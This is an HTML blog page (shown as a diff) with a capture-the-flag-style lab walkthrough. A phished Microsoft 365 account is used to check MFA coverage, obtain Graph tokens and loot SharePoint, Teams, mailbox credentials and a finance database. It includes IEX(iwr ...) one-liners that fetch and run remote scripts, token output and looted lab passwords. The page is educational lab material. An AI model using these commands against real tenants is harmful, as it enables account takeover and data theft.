@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Loot Exchange, Teams and SharePoint with GraphRunner | SecFortress</title>
+<meta name="keywords" content="Azure, Red Teaming, Entra-ID, Powershell, MS SQL">
+<meta name="description" content="In this lab, We look ino the use of a tool, Graphrunner, a post-exploitation toolset for interacting with the Microsoft Graph API......:D">
+<meta name="author" content="SecFortress">
+<link rel="canonical" href="http://localhost:1313/hacking/loot_exchange_teams_and_sharepoint_with_graphrunner/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/loot_exchange_teams_and_sharepoint_with_graphrunner/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/hacking/loot_exchange_teams_and_sharepoint_with_graphrunner/">
+  <meta property="og:site_name" content="SecFortress">
+  <meta property="og:title" content="Loot Exchange, Teams and SharePoint with GraphRunner">
+  <meta property="og:description" content="In this lab, We look ino the use of a tool, Graphrunner, a post-exploitation toolset for interacting with the Microsoft Graph API......:D">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hacking">
+    <meta property="article:published_time" content="2024-10-04T10:46:06+01:00">
+    <meta property="article:modified_time" content="2024-10-04T10:46:06+01:00">
+    <meta property="article:tag" content="Azure">
+    <meta property="article:tag" content="Red Teaming">
+    <meta property="article:tag" content="Entra-ID">
+    <meta property="article:tag" content="Powershell">
+    <meta property="article:tag" content="MS SQL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Loot Exchange, Teams and SharePoint with GraphRunner">
+<meta name="twitter:description" content="In this lab, We look ino the use of a tool, Graphrunner, a post-exploitation toolset for interacting with the Microsoft Graph API......:D">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hackings",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Loot Exchange, Teams and SharePoint with GraphRunner",
+      "item": "http://localhost:1313/hacking/loot_exchange_teams_and_sharepoint_with_graphrunner/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Loot Exchange, Teams and SharePoint with GraphRunner",
+  "name": "Loot Exchange, Teams and SharePoint with GraphRunner",
+  "description": "In this lab, We look ino the use of a tool, Graphrunner, a post-exploitation toolset for interacting with the Microsoft Graph API......:D",
+  "keywords": [
+    "Azure", "Red Teaming", "Entra-ID", "Powershell", "MS SQL"
+  ],
+  "articleBody": "Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nLab Link : https://pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner\nOverview -\u003e Your red team is on an engagement and has successfully phished a Mega Big Tech employee to gain their credentials. So far increasing access within Azure has reached a dead end, and you have been tasked with unlocking further access. In scope is the entire on-premises and cloud infrastructure. Your goal is to gain access to customer records and demonstrate impact.\nWe have been given compromised user credentials for this lab:\nPassword: xxxxxxxxxxxxxx IAM User: Clara.Miller@megabigtech.com First step is to check if multi-factor authentication is enforced for this set of account\nWe can do this using the MFASweep PowerShell script Then we can load this tool to powershell memory as shown below IEX (iwr 'https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1') we can enumerate the presence of MFA on various online Microsoft services with this script, We can also include a check for Active Directory Federated Services in case it is available.\nADFS (Active Directory Federation Services) : A Microsoft service for enabling Single Sign-On (SSO) across applications.\nFederation: Links identity providers, allowing users to access external services with internal credentials. e.g., Office 365, cloud applications etc Single Sign-On (SSO) : Users authenticate once and access multiple applications without re-logging in. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Invoke-MFASweep -Username Clara.Miller@megabigtech.com -Password [REDACTED] -Recon -IncludeADFS ---------------- MFASweep ---------------- ---------------- Running recon checks ---------------- [*] Checking if ADFS configured... [*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft. Confirm MFA Sweep [*] WARNING: This script is about to attempt logging into the Clara.Miller@megabigtech.com account TEN (10) different times (11 if you included ADFS). If you entered an incorrect password this may lock the account out. Are you sure you want to continue? [Y] Yes [N] No [?] Help (default is \"Y\"): ########################### Microsoft API Checks ########################### ---------------- Microsoft Graph API ---------------- [*] Authenticating to Microsoft Graph API... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to https://graph.windows.net [***] NOTE: The \"MSOnline\" PowerShell module should work here. ---------------- Azure Service Management API ---------------- [*] Authenticating to Azure Service Management API... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Azure Service Management API [***] NOTE: The \"Az\" PowerShell module should work here. ############################################################################################################ ########################### Microsoft Web Portal User Agent Checks ########################### ---------------- Microsoft 365 Web Portal w/ (Windows) User Agent ---------------- [*] Authenticating to Microsoft 365 Web Portal using a (Windows) user agent... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now... [**] MFA is enabled and was required for this account. [***] MFA Method Used: PhoneAppOTP ############################################################################################################ ---------------- Microsoft 365 Web Portal w/ (Linux) User Agent ---------------- [*] Authenticating to Microsoft 365 Web Portal using a (Linux) user agent... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now... [**] MFA is enabled and was required for this account. [***] MFA Method Used: PhoneAppOTP ########################### Legacy Auth Checks ########################### ---------------- Microsoft 365 Exchange Web Services ---------------- [*] Authenticating to Microsoft 365 Exchange Web Services (EWS)... [*] Login failed to O365 EWS. ---------------- Microsoft 365 ActiveSync ---------------- [*] Authenticating to Microsoft 365 Active Sync... InvalidOperation: Line | 852 | $resp = $_.Exception.Response.GetResponseStream() | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ | Method invocation failed because [System.Net.Http.HttpResponseMessage] does not contain a method named 'GetResponseStream'. [*] Login to ActiveSync failed. ############################################################################################################ ############################################################################################################ ########################### ADFS Check ########################### ---------------- ADFS Authentication ---------------- [*] Getting ADFS URL... [*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft. [*] Authenticating to On-Prem ADFS Portal at: ######### SINGLE FACTOR ACCESS RESULTS ######### Microsoft Graph API | YES Microsoft Service Management API | YES M365 w/ Windows UA | NO M365 w/ Linux UA | NO M365 w/ MacOS UA | NO M365 w/ Android UA | NO M365 w/ iPhone UA | NO M365 w/ Windows Phone UA | NO Exchange Web Services (BASIC Auth) | NO Active Sync (BASIC Auth) | NO ADFS | NO Notice that single-factor authentication (using only a password) is enabled for our current user on both the Microsoft Graph and Microsoft Service Management APIs!\nMicrosoft 365 apps like Outlook, Teams, and SharePoint use the Graph API, allowing us to extract valuable user content for our engagement.\nWe can check if our current user has been assigned a Microsoft 365 license. Log in to Azure with Connect-AzAccount and Connect-MgGraph Then we can check for license availability with the Get-MgUserLicenseDetail cmdlet The most important information in the above screenshot is the SkuPartNumber value, which indicates the specific Microsoft 365 license assigned to the user. In this case, O365_BUSINESS_ESSENTIALS which allows access to Outlook, Teams, SharePoint and other productivity tools, in the Microsoft 365 suite.\nWe can use the GraphRunner post-exploitation tool to loot in Microsoft 365 environments. We can go ahead and load this tool to powershell memory PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1') ________ __ _______ by Beau Bullock (@dafthack) /_______/___________ ______ | |____/_______\\__ __ ____ ____ ___________ /___\\ __\\______\\____\\ \\_____\\|__|__\\|________/__|__\\/____\\ /____\\_/____\\______\\ \\ \\_\\ \\ | \\// __ \\| |_/ | Y \\ | \\ | / | \\ | \\ ___/| | \\/ \\________/__| (______/__| |___|__|____|___/____/|___|__/___|__/\\___| \u003e__| Do service principals dream of electric sheep? For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki To list GraphRunner modules run List-GraphRunnerModules There is a blog by Black Hills Information Security which breaks down how to use this tool.\nWe can use the below cmdlet to list the available modules. List-GraphRunnerModules The “Pillage Modules” looks like the most interesting module though as it focuses on post-exploitation techniques. So first of all let go ahead and authenticate as our current user to the Microsoft Graph API.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-GraphTokens To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code G2XDH6EUF to authenticate. authorization_pending aud : 00000003-0000-0000-c000-000000000000 iss : https://sts.windows.net/2590ccef-687d-493b-ae8d-441cbab63a72/ iat : 1728122650 nbf : 1728122650 exp : 1728126800 acct : 0 acr : 1 aio : ATQAy/8YAAAA05ZBUjMFAJilG6sckNXmDe43/GFCaL2t9ywVn2fMbkoY9jVqvVH2NRnZZWQ8Mxna amr : {pwd} app_displayname : Microsoft Office appid : d3590ed6-52b3-4102-aeff-aad2292ab01c appidacr : 0 idtyp : user ipaddr : 102.89.68.17 name : Clara Miller oid : 36fa333d-1720-4920-8a5c-2b9b696c6adf --SNIP-- tenant_region_scope : EU tid : 2590ccef-687d-493b-ae8d-441cbab63a72 unique_name : Clara.Miller@megabigtech.com upn : Clara.Miller@megabigtech.com uti : ColAcrlKl0OTH5BHzLwkAA ver : 1.0 wids : {88d8e3e3-8f55-4a1e-953a-9b9898b8876b, b79fbf4d-3ef9-4689-8143-76b194e85509} xms_idrel : 10 1 xms_tcdt : 1671311182 [*] Successful authentication. Access and refresh tokens have been written to the global $tokens variable. To use them with other GraphRunner modules use the Tokens flag (Example. Invoke-DumpApps -Tokens $tokens) [!] Your access token is set to expire on: 10/05/2024 12:13:20 According to the above output, Some modules will require you use the -Tokens $tokens option, Just in case you don’t know what tokens are refer to this blog by @inversecos to understand more.\nIt is also possible to view the help page just like the --help option in bash but this time with the below command syntax starting with first Pillage Module\nGet-Help Invoke-SearchSharePointAndOneDrive -Examples We can then execute this module to search for files containing the string “password”.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password' [*] Using the provided access tokens. [*] Found 2 matches for search term password Result [0] File Name: passwords.xlsx Location: https://iancloudpwned.sharepoint.com/Shared Documents/passwords.xlsx Created Date: 03/27/2024 00:13:10 Last Modified Date: 09/23/2024 21:02:42 Size: 14.79 KB File Preview: \u003cc0\u003epasswords\u003c/c0\u003e Site Username \u003cc0\u003ePassword\u003c/c0\u003e Azure lindsey_adm $R4ncher2043 Dev Env r\u0026d $MEGAPRODUCTS-\u003cddd/\u003e DriveID \u0026 Item ID: b!bT4vhymq0UWW7LvQnMzGLIicHuknVeZGkE3-8tuCtaeO-nKW9TKYT7NHHw0ABSux\\:017K7QPLPAKVIRHIULQ5BK6A3KQTCK2SCD ================================================================================ Result [1] File Name: Finance Logins.docx Location: https://iancloudpwned.sharepoint.com/sites/FinanceTeam/Shared Documents/Finance Logins.docx Created Date: 11/06/2023 00:17:46 Last Modified Date: 11/06/2023 00:17:00 Size: 20.74 KB File Preview: \u003cddd/\u003e\u003cc0\u003ePASSWORDS\u003c/c0\u003e) Service/Account: Finance Database URL: https://10.10.11.15/login Username: \u003cddd/\u003e \u003cc0\u003ePassword\u003c/c0\u003e: F1n@nc3Db2023! Service/Account: Accounting Software URL: https://accounting.\u003cddd/\u003e DriveID \u0026 Item ID: b!XM0yHkS8s0KPA7drboV7c7bd4PO1jD1BpS2fN8axCu6HW_Ya2jEcSZSebeuGuDsI\\:01UALFMSZAKNKICFDDHRH2II4AID3NQRGJ ================================================================================ [*] Do you want to download any of these files? (Yes/No/All) All [***] WARNING - Downloading ALL + 2 matches. [*] Now downloading passwords.xlsx [*] Now downloading Finance Logins.docx [*] Do you want to download any more files? (Yes/No/All) No [*] Quitting... As shown above we have two file retrieved the passwords.xlsx file and the Finance Logins.docx both hosted on the SharePoint site. We also downloaded the files by selecting All when prompted for a response.\nChecking each of this files we have hardcoded embedded credentials in which these logins can provide access to sensitive systems and data, and may also allow server access through abusable functionalities like file uploads or application vulnerabilities.\nFinance Logins.docx ::\npasswords.xlsx ::\nWe can also search for other sensitive files using the search term ‘bonus’.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'bonus' [*] Using the provided access tokens. [*] Found 1 matches for search term bonus Result [0] File Name: Bonuses - Confidential.xlsx Location: https://iancloudpwned-my.sharepoint.com/personal/sam_olsson_megabigtech_com/Documents/Bonuses - Confidential.xlsx Created Date: 11/05/2023 21:50:58 Last Modified Date: 11/05/2023 21:50:58 Size: 17.50 KB File Preview: DriveID \u0026 Item ID: b!qFVO5o9Td0OqTdtkAzLcOeLC9xqzoSxNgtanvmZOWlEk66ey-hWeTL_LW84ry4xf\\:01LMH7HCXMTDF5WDES3ZF3IDWGRV2P4OXB ================================================================================ [*] Do you want to download any of these files? (Yes/No/All) Yes [*] Enter the result number(s) of the file(s) that you want to download. Ex. \"0,10,24\" 0 [*] Now downloading Bonuses - Confidential.xlsx [*] Do you want to download any more files? (Yes/No/All) No [*] Quitting... As shown above a Bonuses - Confidential.xlsx was downloaded and trying to open this file we get the below message\nAfter trying all passwords we have gotten so far in which did not work, i decided to enumerate other Microsoft 365 services, starting with the Invoke-SearchTeams pillage module which searches for all Teams messages in all channels that are readable by the current user.\nInvoke-SearchTeams -Tokens $tokens -SearchTerm password As shown above i was able to get some passwords which worked and had access to the encrypted document.\nIt is also worth searching the mailbox of our current user using the Invoke-SearchMailbox in this context the user ‘`Clara.Miller’\nInvoke-SearchMailbox -Tokens $tokens -SearchTerm \"password\" -MessageCount 40 As shown above we got an image preview showing a username and password of the mbt-finance.database.windows.net server including DB named Finance. According to @pwnedlabs article the use of powershell and VS Code where implemented, But in this article, would show you how to use dbeaver, A community DB management tool.\nFirst of all download the tool using the apt package manager as shown below\nsudo apt install dbeaver Then open up dbeaver and if you don’t get the pop-up as shown in the below image use the hotkey shift+ctrl+N to open up the window and use the search term Azure then select “Azure SQL Server”\nEnter the connection details in the next window including the DB name, Credentials and Host name, Then click Finish once done.\nIf there was a successful host connection, you should see a drop down of different databases as shown below\nWe are mostly interested in the sequence; Database \u003e Finance \u003e Schemas \u003e dbo \u003e Tables \u003e Subscriber \u003e Columns. Where sensitive credentials are stored.\nThe best thing to do is to export the data in the Subscribers table so go ahead and right click on this table and select “Export Data”.\nYou should have a data transfer page, Go ahead and select which format you would like the data to be exported as, I love to use the JSON format, so i will go ahead and chose that.\nThen select Next with the default values until you get to the final page and hit Proceed to finally export the data to your user home folder.\nYou should get the prompt, completed, when the exportation is done and you can now view the exported data as shown below. Go ahead and submit the flag to complete the lab.\nBe cool ⋆˚🐾˖°\n",
+  "wordCount" : "1931",
+  "inLanguage": "en",
+  "datePublished": "2024-10-04T10:46:06+01:00",
+  "dateModified": "2024-10-04T10:46:06+01:00",
+  "author":{
+    "@type": "Person",
+    "name": "SecFortress"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/loot_exchange_teams_and_sharepoint_with_graphrunner/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "SecFortress",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
+                <img src="http://localhost:1313/images/avatar.jpeg" alt="" aria-label="logo"
+                    height="25">SecFortress</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="🥷 Hacking">
+                    <span>🥷 Hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sec-fortress.github.io/" title="✍️ Notes">
+                    <span>✍️ Notes</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami" title="🇳🇬 Whoami">
+                    <span>🇳🇬 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Loot Exchange, Teams and SharePoint with GraphRunner
+    </h1>
+    <div class="post-description">
+      In this lab, We look ino the use of a tool, Graphrunner, a post-exploitation toolset for interacting with the Microsoft Graph API......:D
+    </div>
+    <div class="post-meta"><span title='2024-10-04 10:46:06 +0100 WAT'>October 4, 2024</span>&nbsp;·&nbsp;<span>10 min</span>&nbsp;·&nbsp;<span>SecFortress</span>
+
+</div>
+  </header> 
+
+  <div class="post-content"><p><strong>Note : This article was inspired by content from <a href="https://pwnedlabs.io/labs/intro-to-azure-recon-with-bloodhound">Pwned Labs</a>. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.</strong></p>
+<p><strong>Lab Link :</strong> <a href="https://pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner">https://pwnedlabs.io/labs/loot-exchange-teams-sharepoint-with-graphrunner</a></p>
+<blockquote>
+<p>Overview -&gt; Your red team is on an engagement and has successfully phished a Mega Big Tech employee to gain their credentials. So far increasing access within Azure has reached a dead end, and you have been tasked with unlocking further access. In scope is the entire on-premises and cloud infrastructure. Your goal is to gain access to customer records and demonstrate impact.</p>
+</blockquote>
+<p><img loading="lazy" src="https://i.pinimg.com/originals/dd/80/04/dd8004f0c24c16fa33ed20b7a8d33d21.gif"></p>
+<p>We have been given compromised user credentials for this lab:</p>
+<pre tabindex="0"><code>Password: xxxxxxxxxxxxxx 
+
+IAM User: Clara.Miller@megabigtech.com 
+</code></pre><p>First step is to check if multi-factor authentication is enforced for this set of account</p>
+<ul>
+<li>We can do this using the <a href="https://github.com/dafthack/MFASweep">MFASweep</a> PowerShell script</li>
+<li>Then we can load this tool to powershell memory as shown below</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s1">&#39;https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><p>we can enumerate the presence of MFA on various online Microsoft services with this script, We can also include a check for Active Directory Federated Services in case it is available.</p>
+<p><strong>ADFS (Active Directory Federation Services)</strong> : A Microsoft service for enabling Single Sign-On (SSO) across applications.</p>
+<ul>
+<li><strong>Federation</strong>: Links identity providers, allowing users to access external services with internal credentials. e.g., Office 365, cloud applications etc</li>
+<li><strong>Single Sign-On (SSO)</strong> : Users authenticate once and access multiple applications without re-logging in.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Invoke-MFASweep</span> <span class="n">-Username</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">-Password</span> <span class="p">[</span><span class="no">REDACTED</span><span class="p">]</span> <span class="n">-Recon</span> <span class="n">-IncludeADFS</span>                                   
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">MFASweep</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Running</span> <span class="n">recon</span> <span class="n">checks</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Checking</span> <span class="k">if</span> <span class="n">ADFS</span> <span class="n">configured</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">ADFS</span> <span class="n">does</span> <span class="n">not</span> <span class="n">appear</span> <span class="n">to</span> <span class="n">be</span> <span class="k">in</span> <span class="n">use</span><span class="p">.</span> <span class="n">Authentication</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">managed</span> <span class="n">by</span> <span class="n">Microsoft</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Confirm</span> <span class="n">MFA</span> <span class="n">Sweep</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">WARNING</span><span class="err">:</span> <span class="n">This</span> <span class="n">script</span> <span class="n">is</span> <span class="n">about</span> <span class="n">to</span> <span class="n">attempt</span> <span class="n">logging</span> <span class="n">into</span> <span class="n">the</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">account</span> <span class="n">TEN</span> <span class="p">(</span><span class="mf">10</span><span class="p">)</span> <span class="n">different</span> <span class="n">times</span> <span class="p">(</span><span class="mf">11</span> <span class="k">if</span> <span class="n">you</span> <span class="n">included</span> <span class="n">ADFS</span><span class="p">).</span> <span class="k">If</span> <span class="n">you</span> <span class="n">entered</span> <span class="n">an</span> <span class="n">incorrect</span> <span class="n">password</span>   
+</span></span><span class="line"><span class="cl"><span class="n">this</span> <span class="n">may</span> <span class="n">lock</span> <span class="n">the</span> <span class="n">account</span> <span class="n">out</span><span class="p">.</span> <span class="n">Are</span> <span class="n">you</span> <span class="n">sure</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="k">continue</span><span class="p">?</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Y] Yes  [N</span><span class="p">]</span> <span class="n">No</span>  <span class="p">[?]</span> <span class="n">Help</span> <span class="p">(</span><span class="k">default</span> <span class="n">is</span> <span class="s2">&#34;Y&#34;</span><span class="p">)</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="c">########################### Microsoft API Checks ###########################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Microsoft</span> <span class="n">Graph</span> <span class="n">API</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Microsoft</span> <span class="n">Graph</span> <span class="n">API</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">SUCCESS</span><span class="p">!</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">was</span> <span class="n">able</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="n">to</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">graph</span><span class="p">.</span><span class="py">windows</span><span class="p">.</span><span class="py">net</span>
+</span></span><span class="line"><span class="cl"><span class="p">[***]</span> <span class="n">NOTE</span><span class="err">:</span> <span class="n">The</span> <span class="s2">&#34;MSOnline&#34;</span> <span class="n">PowerShell</span> <span class="n">module</span> <span class="n">should</span> <span class="n">work</span> <span class="n">here</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Azure</span> <span class="n">Service</span> <span class="n">Management</span> <span class="n">API</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Azure</span> <span class="n">Service</span> <span class="n">Management</span> <span class="n">API</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">SUCCESS</span><span class="p">!</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">was</span> <span class="n">able</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Azure</span> <span class="n">Service</span> <span class="n">Management</span> <span class="n">API</span>
+</span></span><span class="line"><span class="cl"><span class="p">[***]</span> <span class="n">NOTE</span><span class="err">:</span> <span class="n">The</span> <span class="s2">&#34;Az&#34;</span> <span class="n">PowerShell</span> <span class="n">module</span> <span class="n">should</span> <span class="n">work</span> <span class="n">here</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="c">############################################################################################################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">########################### Microsoft Web Portal User Agent Checks ###########################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span> <span class="n">w</span><span class="p">/</span> <span class="p">(</span><span class="n">Windows</span><span class="p">)</span> <span class="n">User</span> <span class="n">Agent</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span> <span class="n">using</span> <span class="n">a</span> <span class="p">(</span><span class="n">Windows</span><span class="p">)</span> <span class="n">user</span> <span class="n">agent</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">SUCCESS</span><span class="p">!</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">was</span> <span class="n">able</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span><span class="p">.</span> <span class="n">Checking</span> <span class="n">MFA</span> <span class="n">now</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[**]</span> <span class="n">MFA</span> <span class="n">is</span> <span class="n">enabled</span> <span class="n">and</span> <span class="n">was</span> <span class="n">required</span> <span class="k">for</span> <span class="n">this</span> <span class="n">account</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[***]</span> <span class="n">MFA</span> <span class="n">Method</span> <span class="n">Used</span><span class="err">:</span> <span class="n">PhoneAppOTP</span>
+</span></span><span class="line"><span class="cl"><span class="c">############################################################################################################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span> <span class="n">w</span><span class="p">/</span> <span class="p">(</span><span class="n">Linux</span><span class="p">)</span> <span class="n">User</span> <span class="n">Agent</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span> <span class="n">using</span> <span class="n">a</span> <span class="p">(</span><span class="n">Linux</span><span class="p">)</span> <span class="n">user</span> <span class="n">agent</span><span class="p">...</span>
